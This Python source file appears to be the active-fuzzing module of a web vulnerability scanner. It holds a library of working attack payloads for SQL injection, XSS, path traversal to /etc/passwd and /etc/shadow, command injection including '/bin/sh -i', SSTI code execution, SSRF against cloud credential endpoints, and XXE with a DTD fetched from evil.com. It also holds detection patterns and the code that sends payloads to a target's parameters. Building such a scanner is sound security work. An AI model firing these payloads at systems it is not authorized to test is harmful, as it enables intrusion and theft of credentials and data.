"""
Active Fuzzer — sends real attack payloads to all discovered input surfaces.
This is what separates a real DAST from an LLM-guided curl runner.

Vulnerability classes covered:
  SQLi, XSS, LFI/Path Traversal, CMDi, SSTI, SSRF, XXE,
  Open Redirect, IDOR, Header Injection, CORS, CRLF Injection
"""
from __future__ import annotations
import re
import threading
import time
from dataclasses import dataclass
from typing import Optional, Callable
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import requests.exceptions
import urllib3
urllib3.disable_warnings()

from .scope import ScopeManager
from .evidence import EvidenceStore, evidence_store as _global_store


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARY — 500+ real attack payloads
# ══════════════════════════════════════════════════════════════════════════════

PAYLOADS: dict[str, list[str]] = {

    "sqli_error": [
        "'", '"', "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "' OR 1=1/*", "\" OR \"1\"=\"1", "1' ORDER BY 1--",
        "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--", "'; SELECT SLEEP(0)--",
        "1; SELECT * FROM information_schema.tables--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1 OR 1=1", "1 AND 1=0", "1 AND 1=1",
        "1' AND '1'='1", "1' AND '1'='2",
        "admin'--", "admin' #", "admin'/*",
        "' or 1=1 limit 1 -- -+",
        "1' GROUP BY 1--", "1' GROUP BY 2--",
        "extractvalue(1,concat(0x7e,version()))",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "0x31",  # hex encoding
    ],

    "sqli_blind_time": [
        "' AND SLEEP(3)--",
        "' AND SLEEP(3)#",
        "1; WAITFOR DELAY '0:0:3'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
        "' OR SLEEP(3)--",
        "1 AND SLEEP(3)",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "1;SELECT pg_sleep(3)--",
        "' OR pg_sleep(3)--",
        "'; EXEC master..xp_cmdshell('ping -n 3 127.0.0.1')--",
    ],

    "xss_reflected": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<%2Fscript><script>alert(1)<%2Fscript>",
        "<Script>alert(1)</Script>",   # case variation
        "<SCRIPT>alert(1)</SCRIPT>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "'\"><img src=x onerror=alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<object data=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "${alert(1)}",                 # template literal
        "{{constructor.constructor('alert(1)')()}}",  # AngularJS
    ],

    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",  # double URL encoding
        "..%c0%af..%c0%afetc%c0%afpasswd",       # UTF-8 encoding
        "../../../etc/passwd%00",                 # null byte
        "../../../etc/shadow",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "..\\..\\..\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "C:\\windows\\win.ini",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain,<?php phpinfo(); ?>",
    ],

    "cmdi": [
        ";id",
        "|id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "&&whoami",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "& ls",
        ";sleep 3",
        "|sleep 3",
        "&&sleep 3",
        ";ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
        "`sleep 3`",
        "$(sleep 3)",
        "\n/bin/sh -i",
        ";id;",
        "a;id",
        "a|id",
        "%0aid",           # URL-encoded newline
        "%0a/usr/bin/id",
        "||id",
        "; echo 'CMDI_CONFIRMED'",
        "| echo 'CMDI_CONFIRMED'",
    ],

    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",                           # Jinja2
        "{{config}}",                           # Flask/Jinja2 config leak
        "{{request.environ}}",
        "${7*7}",                               # Freemarker / Velocity
        "${class.getClassLoader()}",
        "*{7*7}",                               # Spring SpEL
        "@{7*7}",                               # Thymeleaf
        "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 RCE vector
        "%{7*7}",                               # JSP EL
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],

    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://100.100.100.200/latest/meta-data/",            # Alibaba
        "http://169.254.169.254/metadata/instance",            # Azure
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",               # Redis
        "http://127.0.0.1:5432",               # Postgres
        "http://127.0.0.1:27017",              # MongoDB
        "http://127.0.0.1:9200",               # Elasticsearch
        "http://127.0.0.1:8080/admin",
        "http://[::1]/",                        # IPv6 localhost
        "http://2130706433/",                   # Decimal IP for 127.0.0.1
        "http://0x7f000001/",                   # Hex IP
        "http://spoofed.burpcollaborator.net/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",
    ],

    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "https://evil.com/",
        "/\\evil.com",
        "https://evil.com?trusted.com",
        "https://trusted.com.evil.com",
        "https://evil.com#trusted.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "\\/\\/evil.com",
        "%2F%2Fevil.com",
        "%0aLocation:https://evil.com",         # CRLF + open redirect
        "https:evil.com",
        "https:%0aevil.com",
        "https://evil%2ecom",
        "https://evil.com%23@trusted.com",
        "///evil.com",
        "////evil.com",
    ],

    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><x/>',
        '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    ],

    "header_injection": [
        "\r\nX-Injected: header",
        "%0d%0aX-Injected: header",
        "%0aX-Injected: header",
        "\nSet-Cookie: evil=1",
        "%0d%0aSet-Cookie: evil=1",
        "\r\nLocation: https://evil.com",
    ],

    "crlf_injection": [
        "%0d%0a",
        "%0a",
        "\r\n",
        "%0d%0aSet-Cookie:evil=1",
        "test%0d%0aInjected: header",
    ],
}

# Detection signatures per vuln class
DETECTORS: dict[str, list[tuple[str, str]]] = {
    "sqli_error": [
        (r"you have an error in your sql", "MySQL error — SQL injection likely confirmed"),
        (r"warning: mysql_", "PHP MySQL error — SQL injection point exposed"),
        (r"ORA-\d+",         "Oracle DB error — SQL injection likely confirmed"),
        (r"PSQLException",   "PostgreSQL error — SQL injection likely confirmed"),
        (r"sqlite_",         "SQLite error — SQL injection likely confirmed"),
        (r"Microsoft SQL.*Native Client", "MSSQL error — SQL injection confirmed"),
        (r"Unclosed quotation mark",      "MSSQL syntax error — SQL injection confirmed"),
        (r"pg_query\(\)",    "PostgreSQL query error — injection point"),
        (r"supplied argument is not a valid MySQL", "MySQL injection error"),
        (r"mysql_num_rows\(\)", "PHP MySQL function exposed"),
        (r"Column count doesn't match", "MySQL UNION injection — column count mismatch"),
    ],
    "sqli_blind_time": [],  # detected by response time delta
    "xss_reflected": [
        (r"<script>alert\(1\)</script>", "Reflected XSS confirmed — script tag unescaped"),
        (r"onerror=alert\(1\)",          "Reflected XSS confirmed — onerror unescaped"),
        (r"<svg onload=alert\(1\)>",     "Reflected XSS confirmed — SVG onload unescaped"),
        (r"onload=alert\(1\)",           "Reflected XSS — event handler reflected"),
        (r"<img src=x onerror",          "Reflected XSS — img onerror reflected"),
        (r"javascript:alert\(1\)",       "Reflected XSS — javascript: URI reflected"),
    ],
    "lfi": [
        (r"root:x:0:0:",                 "LFI CONFIRMED — /etc/passwd readable"),
        (r"root:\*:0:0:",                "LFI CONFIRMED — /etc/passwd readable"),
        (r"/bin/bash",                   "LFI confirmed — shell path visible"),
        (r"\[fonts\]",                   "LFI CONFIRMED — Windows win.ini readable"),
        (r"\[extensions\]",              "LFI confirmed — Windows ini file readable"),
        (r"PHP Version",                 "LFI to phpinfo — PHP info exposed"),
        (r"daemon:x:",                   "LFI confirmed — /etc/passwd content visible"),
        (r"PATH=/",                      "LFI confirmed — /proc/self/environ readable"),
    ],
    "cmdi": [
        (r"uid=\d+\(",          "COMMAND INJECTION CONFIRMED — id output in response"),
        (r"uid=0\(root\)",      "COMMAND INJECTION AS ROOT — full system compromise"),
        (r"CMDI_CONFIRMED",     "Command injection confirmed — echo payload returned"),
        (r"(?m)^root\s*$",      "Command injection confirmed — whoami=root"),
        (r"Linux.*#\d+",        "Command injection — uname output visible"),
        (r"Microsoft Windows",  "Command injection — Windows version in response"),
    ],
    "ssti": [
        (r"\b49\b",             "SSTI likely — 7*7=49 arithmetic evaluated"),
        (r"\b7777777\b",        "SSTI confirmed — 7*'7'='7777777' Jinja2"),
        (r"<Config ",           "SSTI — Flask config object leaked"),
        (r"<class '",           "SSTI — Python class objects exposed"),
        (r"Traceback \(most recent", "SSTI error — Python traceback visible"),
    ],
    "ssrf": [
        (r"ami-id",             "SSRF CONFIRMED — AWS metadata service accessible"),
        (r"instance-id",        "SSRF confirmed — AWS/GCP metadata reachable"),
        (r"iam/security-cred",  "SSRF CRITICAL — AWS IAM credentials accessible"),
        (r"SSH-\d+\.\d+",       "SSRF confirmed — internal SSH service reachable"),
        (r'"computeMetadata"',  "SSRF confirmed — GCP metadata accessible"),
        (r"redis_version",      "SSRF confirmed — internal Redis accessible"),
        (r"elastic",            "SSRF confirmed — internal Elasticsearch accessible"),
    ],
    "open_redirect": [
        (r"Location:.*evil\.com", "Open redirect confirmed — redirects to evil.com"),
    ],
    "xxe": [
        (r"root:x:0:0:",        "XXE CONFIRMED — /etc/passwd readable via XML"),
        (r"daemon:x:",          "XXE confirmed — system file readable"),
        (r"ami-id",             "XXE+SSRF confirmed — metadata accessible via XXE"),
    ],
    "header_injection": [
        (r"X-Injected: header", "Header injection confirmed — injected header reflected"),
        (r"Set-Cookie: evil=1", "CRLF injection confirmed — cookie injected"),
    ],
}


@dataclass
class FuzzResult:
    url:           str
    method:        str
    param:         str
    param_type:    str
    payload:       str
    vuln_type:     str
    finding:       str
    severity:      str
    evidence_id:   Optional[str] = None
    resp_time_ms:  float = 0.0
    status_code:   int = 0


class Fuzzer:
    """
    Active payload fuzzer. Takes input surfaces from Crawler.SiteMap
    and sends real attack payloads against each discovered parameter.
    """

    SEV_MAP = {
        "sqli_error":       "high",
        "sqli_blind_time":  "high",
        "xss_reflected":    "high",
        "lfi":              "critical",
        "cmdi":             "critical",
        "ssti":             "high",
        "ssrf":             "critical",
        "open_redirect":    "medium",
        "xxe":              "critical",
        "header_injection": "medium",
        "crlf_injection":   "medium",
    }

    # Which vuln types to run per param type
    PARAM_TYPE_MAP: dict[str, list[str]] = {
        "query":  ["sqli_error", "sqli_blind_time", "xss_reflected", "lfi",
                   "cmdi", "ssti", "ssrf", "open_redirect"],
        "form":   ["sqli_error", "sqli_blind_time", "xss_reflected", "lfi",
                   "cmdi", "ssti", "open_redirect"],
        "header": ["header_injection", "crlf_injection", "sqli_error"],
        "path":   ["sqli_error", "lfi"],
        "json":   ["sqli_error", "xss_reflected", "ssti"],
        "cookie": ["sqli_error", "xss_reflected"],
    }

    def __init__(
        self,
        scope: ScopeManager,
        session: requests.Session,
        ev_store: EvidenceStore | None = None,
        timeout:       int = 10,
        time_threshold: float = 2.5,   # seconds delta for time-based detection
        max_surfaces:  int = 500,
        rate_limit:    float = 0.05,   # min seconds between requests
        on_finding: Callable | None = None,
        stop_event: threading.Event | None = None,
    ):
        self.scope          = scope
        self.session        = session
        self.ev_store       = ev_store or _global_store
        self.timeout        = timeout
        self.time_threshold = time_threshold
        self.max_surfaces   = max_surfaces
        self.rate_limit     = rate_limit
        self.on_finding     = on_finding
        self.stop_event     = stop_event or threading.Event()
        self.results:       list[FuzzResult] = []
        self._lock          = threading.Lock()

    def fuzz_all(self, surfaces: list) -> list[FuzzResult]:
        """
        Fuzz all input surfaces. Returns list of confirmed findings.
        Runs in parallel threads up to 5 concurrent.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed

        limited = surfaces[:self.max_surfaces]
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = {pool.submit(self._fuzz_surface, s): s for s in limited}
            for fut in as_completed(futures):
                if self.stop_event.is_set():
                    break
                try:
                    fut.result()
                except Exception:
                    pass
        return self.results

    def _fuzz_surface(self, surface):
        vuln_types = self.PARAM_TYPE_MAP.get(surface.param_type, ["sqli_error", "xss_reflected"])

        for vuln_type in vuln_types:
            if self.stop_event.is_set():
                return
            payloads = PAYLOADS.get(vuln_type, [])
            if not payloads:
                continue

            # For time-based, need baseline first
            baseline_time = None
            if vuln_type == "sqli_blind_time":
                baseline_time = self._baseline(surface)

            for payload in payloads[:8]:   # max 8 payloads per vuln type per surface
                if self.stop_event.is_set():
                    return
                time.sleep(self.rate_limit)
                self._send_payload(surface, vuln_type, payload, baseline_time)

    def _baseline(self, surface) -> float:
        """Measure baseline response time for time-based detection."""
        try:
            t0   = time.time()
            self.session.request(
                surface.method,
                self._build_url(surface, "BASELINE_VALUE"),
                data=self._build_body(surface, "BASELINE_VALUE") if surface.method != "GET" else None,
                timeout=self.timeout, verify=False, allow_redirects=False,
            )
            return time.time() - t0
        except Exception:
            return 1.0

    def _send_payload(self, surface, vuln_type: str, payload: str, baseline: Optional[float]):
        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        if not self.scope.in_scope(url):
            return

        try:
            t0   = time.time()
            resp = self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            elapsed = (time.time() - t0) * 1000

        except requests.exceptions.Timeout:
            elapsed = self.timeout * 1000
            # Timeout on time-based payload = positive signal
            if vuln_type == "sqli_blind_time" and baseline is not None:
                finding_text = f"Time-based blind SQLi — response timed out on SLEEP payload [{surface.param}={payload}]"
                self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                     url, {}, str(headers), "", elapsed, 408)
            return
        except Exception:
            return

        resp_text = ""
        try:
            resp_text = resp.text
        except Exception:
            pass

        # ── Time-based blind detection ────────────────────────────────────
        if vuln_type == "sqli_blind_time" and baseline is not None:
            delta = (elapsed / 1000) - baseline
            if delta >= self.time_threshold:
                finding_text = (
                    f"Time-based blind SQLi CONFIRMED — response delayed {delta:.1f}s "
                    f"on SLEEP payload [{surface.param}={payload}]"
                )
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
            return

        # ── Open redirect — check Location header ─────────────────────────
        if vuln_type == "open_redirect":
            location = resp.headers.get("location", "") or resp.headers.get("Location", "")
            if location and "evil.com" in location.lower():
                finding_text = f"Open Redirect CONFIRMED — Location: {location} [{surface.param}={payload}]"
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text, "medium",
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
            return

        # ── Pattern-based detection ───────────────────────────────────────
        for pattern, desc in DETECTORS.get(vuln_type, []):
            if re.search(pattern, resp_text, re.I | re.S):
                finding_text = f"{desc} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text,
                                     self.SEV_MAP.get(vuln_type, "medium"),
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
                return   # one finding per payload is enough

    # ── Request builders ──────────────────────────────────────────────────────

    def _build_url(self, surface, payload: str) -> str:
        if surface.param_type == "query":
            from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
            p = urlparse(surface.url)
            params = parse_qs(p.query)
            params[surface.param] = [payload]
            new_query = urlencode({k: v[0] for k, v in params.items()})
            return urlunparse(p._replace(query=new_query))
        return surface.url

    def _build_body(self, surface, payload: str) -> Optional[str]:
        if surface.param_type == "form" and surface.method not in ("GET", "HEAD"):
            from urllib.parse import parse_qs, urlencode
            base = {k: v[0] for k, v in parse_qs(surface.body_template).items()}
            base[surface.param] = payload
            return urlencode(base)
        if surface.param_type == "json" and surface.method not in ("GET", "HEAD"):
            import json
            return json.dumps({surface.param: payload})
        return None

    def _build_headers(self, surface, payload: str) -> dict:
        h = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)"}
        if surface.param_type == "header":
            h[surface.param] = payload
        if surface.content_type:
            h["Content-Type"] = surface.content_type
        return h

    # ── Result recording ──────────────────────────────────────────────────────

    def _store_evidence(self, surface, vuln_type: str, payload: str, url: str,
                        req_headers: dict, req_body: str,
                        resp: requests.Response, elapsed: float) -> str:
        return self.ev_store.record(
            url=url,
            method=surface.method,
            req_headers=req_headers,
            req_body=req_body,
            status_code=resp.status_code,
            resp_headers=dict(resp.headers),
            resp_body=resp.text[:4096],
            resp_time_ms=elapsed,
            vuln_type=vuln_type,
            payload=payload,
            parameter=surface.param,
        )

    def _record_finding(self, surface, vuln_type: str, payload: str,
                        finding_text: str, severity: str,
                        url: str, resp_headers: dict, req_headers: str,
                        resp_text: str, elapsed: float, status: int,
                        eid: Optional[str] = None):
        result = FuzzResult(
            url=surface.url, method=surface.method,
            param=surface.param, param_type=surface.param_type,
            payload=payload, vuln_type=vuln_type,
            finding=finding_text, severity=severity,
            evidence_id=eid, resp_time_ms=elapsed, status_code=status,
        )
        with self._lock:
            self.results.append(result)
        if self.on_finding:
            self.on_finding(result)
